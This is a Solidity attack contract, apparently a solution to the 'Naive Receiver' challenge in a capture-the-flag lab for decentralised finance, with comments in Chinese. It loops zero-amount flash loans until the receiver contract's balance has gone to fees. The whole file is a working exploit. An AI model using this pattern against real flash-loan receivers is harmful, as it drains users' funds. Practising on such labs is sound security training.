pragma solidity ^0.8.0;

import "../naive-receiver/FlashLoanReceiver.sol";
import "../naive-receiver/NaiveReceiverLenderPool.sol";
contract NaiveReceiverAttack {
  NaiveReceiverLenderPool public pool;
  FlashLoanReceiver public receiver;
  
  // 初始化设置借贷池合约和执行闪电贷的合约。
  constructor (address payable _pool, address payable _receiver) {
    pool = NaiveReceiverLenderPool(_pool);
    receiver = FlashLoanReceiver(_receiver);
  }
  
  // 攻击方法: 只要发现 receiver 中有余额够付手续费就进行闪电贷操作
  function attack () external {
    // 获取手续费的值
    uint fee = pool.fixedFee();
    while (address(receiver).balance >= fee) {
      pool.flashLoan(address(receiver), 0);
    }
  }
}
